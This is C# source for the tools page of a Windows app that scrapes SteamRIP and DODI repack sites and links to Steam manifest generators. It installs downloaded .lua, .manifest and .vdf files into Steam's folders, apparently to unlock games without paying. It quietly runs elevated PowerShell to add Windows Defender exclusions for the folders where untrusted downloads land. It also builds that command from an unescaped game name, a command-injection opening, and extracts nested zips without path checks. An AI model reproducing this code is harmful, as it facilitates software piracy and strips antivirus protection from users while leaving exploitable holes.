using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using Microsoft.Web.WebView2.Core;
using SpokysProjectVercel.Models;
using SpokysProjectVercel.Services;

namespace SpokysProjectVercel.Views
{
    public class ToolInfo
    {
        public string Icon { get; set; } = string.Empty;
        public string Name { get; set; } = string.Empty;
        public string Description { get; set; } = string.Empty;
        public string Url { get; set; } = string.Empty;
    }

    public partial class ToolsPage : UserControl
    {
        public ToolsPage()
        {
            InitializeComponent();
            Loaded += ToolsPage_Loaded;
        }

        private async void ToolsPage_Loaded(object sender, RoutedEventArgs e)
        {
            UpdateModeBadge();
            AppMode.ModeChanged += () => Dispatcher.BeginInvoke(() => UpdateModeBadge());

            ToolsList.ItemsSource = new List<ToolInfo>
            {
                new() { Icon = "📦", Name = "DepotBox", Description = "A Steam depot generator with 133K+ games. Generate and download depot manifests and Lua scripts.", Url = "https://depotbox.org" },
                new() { Icon = "📜", Name = "Ryuu's Manifest", Description = "Generate and download Steam manifests from Ryuu's repository.", Url = "https://generator.ryuu.lol" },
                new() { Icon = "⚡", Name = "LuaTools", Description = "Manifest generator and Steam plugin for managing DLC unlocks and game fixes.", Url = "https://lua.tools" },
                new() { Icon = "🌐", Name = "SteamDB", Description = "Comprehensive Steam database with depots, manifests, and app info.", Url = "https://steamdb.info" }
            };

            await LoadPopularGamesAsync("all");
        }

        private async Task LoadPopularGamesAsync(string filter)
        {
            try
            {
                PopularGamesStatus.Text = filter == "all" ? "Loading popular games from SteamRIP & DODI..." :
                                         filter == "steamrip" ? "Loading popular games from SteamRIP..." :
                                         "Loading popular games from DODI Repacks...";

                var games = await PopularGamesService.GetPopularGamesAsync(filter, 20);
                
                if (games.Count == 0)
                {
                    games = PopularGamesService.GetFallbackPopularGames(20);
                    PopularGamesStatus.Text = "Loaded cached popular games (offline mode)";
                }
                else
                {
                    PopularGamesStatus.Text = $"Loaded {games.Count} popular games";
                }

                PopularGamesList.ItemsSource = games;
            }
            catch (Exception ex)
            {
                PopularGamesStatus.Text = $"Error loading games: {ex.Message}";
                PopularGamesList.ItemsSource = PopularGamesService.GetFallbackPopularGames(20);
            }
        }

        private async void PopularGamesFilter_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!IsLoaded || PopularGamesStatus == null || PopularGamesFilter?.SelectedItem is not ComboBoxItem item)
                return;
            var filter = item.Content.ToString()?.Contains("SteamRIP") == true ? "steamrip" :
                        item.Content.ToString()?.Contains("DODI") == true ? "dodi" : "all";
            await LoadPopularGamesAsync(filter);
        }

        private async void RefreshPopularGames_Click(object sender, RoutedEventArgs e)
        {
            if (PopularGamesStatus == null || PopularGamesFilter?.SelectedItem is not ComboBoxItem item)
                return;
            var filter = item.Content.ToString()?.Contains("SteamRIP") == true ? "steamrip" :
                        item.Content.ToString()?.Contains("DODI") == true ? "dodi" : "all";
            await LoadPopularGamesAsync(filter);
        }

        private async void PopularGameCard_Click(object sender, MouseButtonEventArgs e)
        {
            if (sender is FrameworkElement el && el.Tag is string url && !string.IsNullOrEmpty(url))
            {
                var gameName = el.DataContext is PopularGame game ? game.Name : "Game";
                await AddGameFromUrl(url, gameName);
            }
        }

        private async Task AddGameFromUrl(string url, string gameName)
        {
            GameUrlBox.Text = url;
            GameUrlStatus.Text = $"Found: {gameName}";
            await AddGame();
        }

        private void UpdateModeBadge()
        {
            if (AppMode.UseLumaCore)
            {
                ModeBadgeText.Text = "⚡ LC";
                ModeBadge.Background = (System.Windows.Media.Brush)Application.Current.FindResource("PrimaryBrush");
            }
            else
            {
                ModeBadgeText.Text = "🛠️ ST";
                ModeBadge.Background = (System.Windows.Media.Brush)Application.Current.FindResource("AccentBrush");
            }
        }

        private async void ToolCard_Click(object sender, MouseButtonEventArgs e)
        {
            if (sender is FrameworkElement el && el.Tag is string url && !string.IsNullOrEmpty(url))
            {
                ToolListView.Visibility = Visibility.Collapsed;
                WebViewPanel.Visibility = Visibility.Visible;
                var toolName = el.DataContext is ToolInfo info ? info.Name : "Tool";
                WebViewTitle.Text = toolName;

                if (ToolWebView.CoreWebView2 == null)
                {
                    var env = await CoreWebView2Environment.CreateAsync(null,
                        System.IO.Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            "SpokysPL", "ToolsWebView2"));
                    await ToolWebView.EnsureCoreWebView2Async(env);
                    ToolWebView.CoreWebView2.Settings.UserAgent =
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                    ToolWebView.CoreWebView2.NewWindowRequested += (_, args) => args.Handled = true;

                    // Add Defender exclusions for temp download paths
                    AddDefenderExclusion(Path.Combine(Path.GetTempPath(), "SpokysPL"));
                    var steamPath = SteamService.FindSteamPath();
                    if (!string.IsNullOrEmpty(steamPath))
                    {
                        AddDefenderExclusion(Path.Combine(steamPath, "depotcache"));
                        AddDefenderExclusion(Path.Combine(steamPath, "config", "depotcache"));
                        AddDefenderExclusion(Path.Combine(steamPath, "config", "stplug-in"));
                    }

                    var capturedName = toolName;
                    ToolWebView.CoreWebView2.DownloadStarting += (_, args) =>
                    {
                        args.Handled = true;
                        var tempDir = Path.Combine(Path.GetTempPath(), "SpokysPL", "WebViewDownloads");
                        Directory.CreateDirectory(tempDir);
                        AddDefenderExclusion(tempDir);
                        var fileName = args.DownloadOperation.Uri.Split('/').LastOrDefault() ?? "download";
                        if (!Path.HasExtension(fileName)) fileName += ".zip";
                        args.ResultFilePath = Path.Combine(tempDir, SanitizeFileName(fileName));

                        var download = args.DownloadOperation;
                        download.StateChanged += async (_, _) =>
                        {
                            if (download.State == CoreWebView2DownloadState.Completed)
                            {
                                var filePath = args.ResultFilePath;
                                if (File.Exists(filePath))
                                    await ProcessDownloadedFile(filePath, capturedName);
                            }
                        };
                    };
                }

                ToolWebView.CoreWebView2?.Navigate(url);
            }
        }

        private void WebViewBack_Click(object sender, RoutedEventArgs e)
        {
            WebViewPanel.Visibility = Visibility.Collapsed;
            ToolListView.Visibility = Visibility.Visible;
            ToolWebView.CoreWebView2?.NavigateToString("<html><body style='background:#000'></body></html>");
        }

        private void WebViewExternal_Click(object sender, RoutedEventArgs e)
        {
            if (ToolWebView.Source != null)
            {
                Process.Start(new ProcessStartInfo { FileName = ToolWebView.Source.ToString(), UseShellExecute = true });
            }
        }

        private async void GameUrlBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) await AddGame();
        }

        private async void AddGameBtn_Click(object sender, RoutedEventArgs e)
        {
            await AddGame();
        }

        private async Task AddGame()
        {
            var url = GameUrlBox.Text.Trim();
            if (string.IsNullOrEmpty(url)) return;

            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
                (uri.Scheme != "http" && uri.Scheme != "https"))
            {
                GameUrlStatus.Text = "❌ Invalid URL";
                return;
            }

            var source = uri.Host.Contains("steamrip.com") ? "steamrip" :
                         uri.Host.Contains("dodi-repacks.download") ? "dodi" : null;

            if (source == null)
            {
                GameUrlStatus.Text = "❌ Unsupported source. Use SteamRIP or DODI Repack URLs.";
                return;
            }

            SourceIcon.Text = source == "steamrip" ? "🎮" : "📦";
            SourceLabel.Text = source == "steamrip" ? "SteamRIP" : "DODI";
            GameUrlStatus.Text = "Fetching download links...";

            try
            {
                var game = new ScrapedGame { Name = "", PageUrl = url, Source = source };
                var result = await GameScraperService.ScrapePage(game);

                if (result.Downloads.Count == 0)
                {
                    GameUrlStatus.Text = "❌ No download links found.";
                    return;
                }

                var name = result.Name;
                if (string.IsNullOrEmpty(name))
                {
                    name = uri.Segments.LastOrDefault()?.Replace("/", "").Replace("-", " ") ?? "Game";
                    name = System.Net.WebUtility.UrlDecode(name);
                }

                GameUrlStatus.Text = $"✅ Found {result.Downloads.Count} link(s) — {name}";

                var chooseDialog = new Window
                {
                    Title = $"Downloads - {name}",
                    Width = 560,
                    Height = 400,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Owner = Window.GetWindow(this),
                    Background = (System.Windows.Media.Brush)Application.Current.FindResource("CardBrush"),
                    Foreground = (System.Windows.Media.Brush)Application.Current.FindResource("TextPrimaryBrush")
                };

                var panel = new StackPanel { Margin = new Thickness(16) };
                panel.Children.Add(new TextBlock
                {
                    Text = $"Download links for: {name}",
                    FontSize = 15,
                    FontWeight = FontWeights.Bold,
                    Foreground = (System.Windows.Media.Brush)Application.Current.FindResource("CardForegroundBrush"),
                    Margin = new Thickness(0, 0, 0, 12)
                });

                foreach (var dl in result.Downloads)
                {
                    var row = new Border
                    {
                        Style = (Style)Application.Current.FindResource("ModernCardHover"),
                        Padding = new Thickness(10),
                        Margin = new Thickness(0, 0, 0, 6),
                        Cursor = Cursors.Hand,
                        Tag = dl.Url
                    };
                    var grid = new Grid();
                    grid.ColumnDefinitions.Add(new ColumnDefinition());
                    grid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

                    grid.Children.Add(new TextBlock
                    {
                        Text = dl.Url.Length > 60 ? dl.Url[..60] + "..." : dl.Url,
                        FontSize = 12,
                        Foreground = (System.Windows.Media.Brush)Application.Current.FindResource("CardForegroundBrush"),
                        VerticalAlignment = VerticalAlignment.Center
                    });
                    grid.Children.Add(new TextBlock
                    {
                        Text = "⬇ Download",
                        FontSize = 12,
                        Foreground = (System.Windows.Media.Brush)Application.Current.FindResource("PrimaryBrush"),
                        VerticalAlignment = VerticalAlignment.Center,
                        Margin = new Thickness(10, 0, 0, 0)
                    });
                    Grid.SetColumn(grid.Children[1], 1);

                    row.Child = grid;
                    row.MouseLeftButtonDown += async (s, args) =>
                    {
                        if (s is Border b && b.Tag is string dlUrl)
                        {
                            chooseDialog.Close();
                            await DownloadAndExtract(name, dlUrl);
                        }
                    };
                    panel.Children.Add(row);
                }

                var scroll = new ScrollViewer { Content = panel };
                chooseDialog.Content = scroll;
                chooseDialog.ShowDialog();
            }
            catch (Exception ex)
            {
                GameUrlStatus.Text = $"❌ Error: {ex.Message}";
            }
        }

        private async Task DownloadAndExtract(string gameName, string url)
        {
            DownloadOverlay.Visibility = Visibility.Visible;
            DownloadTitle.Text = $"Downloading: {gameName}";
            DownloadStatus.Text = "Starting...";

            try
            {
                var tempDir = Path.Combine(Path.GetTempPath(), "SpokysPL", "GameDownloads", SanitizeFileName(gameName));
                Directory.CreateDirectory(tempDir);
                AddDefenderExclusion(tempDir);

                var progress = new Progress<double>(p =>
                {
                    Dispatcher.BeginInvoke(() =>
                    {
                        DownloadProgress.Value = p;
                        DownloadStatus.Text = $"{p:F0}%";
                    });
                });

                var filePath = await GameScraperService.DownloadFileAsync(url, tempDir, progress);
                if (filePath == null)
                {
                    DownloadStatus.Text = "Download failed.";
                    await Task.Delay(2000);
                    DownloadOverlay.Visibility = Visibility.Collapsed;
                    return;
                }

                DownloadStatus.Text = "Extracting & installing...";
                DownloadProgress.Value = 0;

                var steamPath = SteamService.FindSteamPath();
                if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                {
                    DownloadStatus.Text = "Steam not found. File saved at: " + filePath;
                    await Task.Delay(3000);
                    DownloadOverlay.Visibility = Visibility.Collapsed;
                    return;
                }

                var depotCache = Path.Combine(steamPath, "depotcache");
                var configDepot = Path.Combine(steamPath, "config", "depotcache");
                var stplugIn = Path.Combine(steamPath, "config", "stplug-in");
                Directory.CreateDirectory(depotCache);
                Directory.CreateDirectory(configDepot);
                Directory.CreateDirectory(stplugIn);

                int lua = 0, manifest = 0, vdf = 0;

                var ext = Path.GetExtension(filePath).ToLowerInvariant();
                if (ext is ".zip" or ".rar" or ".7z" or ".tar" or ".gz")
                {
                    // Extract archive and install contents directly to Steam
                    var extractDir = Path.Combine(tempDir, "extracted");
                    Directory.CreateDirectory(extractDir);

                    var extractOk = await GameScraperService.ExtractArchiveAsync(filePath, extractDir,
                        new Progress<double>(p => Dispatcher.BeginInvoke(() => DownloadProgress.Value = p)));

                    if (extractOk)
                    {
                        InstallGameFiles(extractDir, depotCache, configDepot, stplugIn, ref lua, ref manifest, ref vdf);
                        DownloadProgress.Value = 100;
                        try { Directory.Delete(extractDir, true); } catch { }
                    }
                }
                else
                {
                    // Direct .lua / .manifest / .vdf — copy to Steam dirs
                    InstallSingleFile(filePath, depotCache, configDepot, stplugIn, ref lua, ref manifest, ref vdf);
                }

                try { File.Delete(filePath); } catch { }
                try { Directory.Delete(tempDir, true); } catch { }

                if (lua + manifest + vdf > 0)
                {
                    var parts = new List<string>();
                    if (lua > 0) parts.Add($"{lua} .lua");
                    if (manifest > 0) parts.Add($"{manifest} .manifest");
                    if (vdf > 0) parts.Add($"{vdf} .vdf");
                    var msg = $"✅ {gameName} — added {string.Join(", ", parts)} to Steam";
                    DownloadStatus.Text = msg;
                    ToastService.Show(msg, "success");
                }
                else
                {
                    DownloadStatus.Text = "No .lua, .manifest, or .vdf files found in the download.";
                }

                await Task.Delay(2000);
            }
            catch (Exception ex)
            {
                DownloadStatus.Text = $"Error: {ex.Message}";
                await Task.Delay(3000);
            }
            finally
            {
                DownloadOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private static void InstallSingleFile(string file, string depotCache, string configDepot, string stplugIn,
            ref int luaCount, ref int manifestCount, ref int vdfCount)
        {
            var ext = Path.GetExtension(file).ToLowerInvariant();
            if (ext == ".lua")
            {
                File.Copy(file, Path.Combine(stplugIn, Path.GetFileName(file)), true);
                luaCount++;
            }
            else if (ext == ".manifest")
            {
                File.Copy(file, Path.Combine(depotCache, Path.GetFileName(file)), true);
                File.Copy(file, Path.Combine(configDepot, Path.GetFileName(file)), true);
                manifestCount++;
            }
            else if (ext == ".vdf")
            {
                var keysDir = ManifestPaths.KeysDir;
                Directory.CreateDirectory(keysDir);
                File.Copy(file, Path.Combine(keysDir, Path.GetFileName(file)), true);
                vdfCount++;
            }
        }

        private async Task ProcessDownloadedFile(string filePath, string source)
        {
            try
            {
                var steamPath = SteamService.FindSteamPath();
                if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath)) return;

                var depotCache = Path.Combine(steamPath, "depotcache");
                var configDepot = Path.Combine(steamPath, "config", "depotcache");
                var stplugIn = Path.Combine(steamPath, "config", "stplug-in");
                Directory.CreateDirectory(depotCache);
                Directory.CreateDirectory(configDepot);
                Directory.CreateDirectory(stplugIn);

                int lua = 0, manifest = 0, vdf = 0;
                var ext = Path.GetExtension(filePath).ToLowerInvariant();

                if (ext is ".zip" or ".rar" or ".7z" or ".tar" or ".gz")
                {
                    var tempDir = Path.Combine(Path.GetTempPath(), "SpokysPL", "WebViewDownloads", "extracted");
                    Directory.CreateDirectory(tempDir);
                    try
                    {
                        await GameScraperService.ExtractArchiveAsync(filePath, tempDir, null);
                        InstallGameFiles(tempDir, depotCache, configDepot, stplugIn, ref lua, ref manifest, ref vdf);
                    }
                    finally
                    {
                        try { Directory.Delete(tempDir, true); } catch { }
                    }
                }
                else
                {
                    InstallSingleFile(filePath, depotCache, configDepot, stplugIn, ref lua, ref manifest, ref vdf);
                }

                try { File.Delete(filePath); } catch { }

                if (lua + manifest + vdf > 0)
                {
                    var parts = new List<string>();
                    if (lua > 0) parts.Add($"{lua} .lua");
                    if (manifest > 0) parts.Add($"{manifest} .manifest");
                    if (vdf > 0) parts.Add($"{vdf} .vdf");
                    var msg = $"✅ {source} — added {string.Join(", ", parts)} to Steam";
                    Dispatcher.BeginInvoke(() => ToastService.Show(msg, "success"));
                }
            }
            catch { }
        }

        private static string SanitizeFileName(string name)
        {
            var invalid = Path.GetInvalidFileNameChars();
            return string.Join("_", name.Split(invalid, StringSplitOptions.RemoveEmptyEntries)).TrimEnd('.');
        }

        private static void InstallGameFiles(string dir, string depotCache, string configDepot, string stplugIn,
            ref int luaCount, ref int manifestCount, ref int vdfCount)
        {
            foreach (var file in Directory.GetFiles(dir))
            {
                var ext = Path.GetExtension(file).ToLowerInvariant();
                if (ext == ".lua")
                {
                    File.Copy(file, Path.Combine(stplugIn, Path.GetFileName(file)), true);
                    luaCount++;
                }
                else if (ext == ".manifest")
                {
                    File.Copy(file, Path.Combine(depotCache, Path.GetFileName(file)), true);
                    File.Copy(file, Path.Combine(configDepot, Path.GetFileName(file)), true);
                    manifestCount++;
                }
                else if (ext == ".vdf")
                {
                    var keysDir = ManifestPaths.KeysDir;
                    Directory.CreateDirectory(keysDir);
                    File.Copy(file, Path.Combine(keysDir, Path.GetFileName(file)), true);
                    vdfCount++;
                }
                else if (ext == ".zip")
                {
                    var nestedDir = Path.Combine(dir, Path.GetFileNameWithoutExtension(file) + "_extracted");
                    Directory.CreateDirectory(nestedDir);
                    try
                    {
                        using var fs = new FileStream(file, FileMode.Open, FileAccess.Read);
                        using var archive = new System.IO.Compression.ZipArchive(fs, System.IO.Compression.ZipArchiveMode.Read);
                        foreach (var entry in archive.Entries)
                        {
                            if (string.IsNullOrEmpty(entry.Name)) continue;
                            var destPath = Path.Combine(nestedDir, entry.FullName);
                            var parent = Path.GetDirectoryName(destPath);
                            if (!string.IsNullOrEmpty(parent)) Directory.CreateDirectory(parent);
                            entry.ExtractToFile(destPath, true);
                        }
                    }
                    catch { }
                    InstallGameFiles(nestedDir, depotCache, configDepot, stplugIn, ref luaCount, ref manifestCount, ref vdfCount);
                    try { File.Delete(file); } catch { }
                }
            }
            foreach (var subDir in Directory.GetDirectories(dir))
                InstallGameFiles(subDir, depotCache, configDepot, stplugIn, ref luaCount, ref manifestCount, ref vdfCount);
        }

        private static void AddDefenderExclusion(string path)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"Add-MpPreference -ExclusionPath '{path}'\"",
                    UseShellExecute = true,
                    Verb = "runas"
                };
                Process.Start(psi);
            }
            catch { }
        }
    }
}
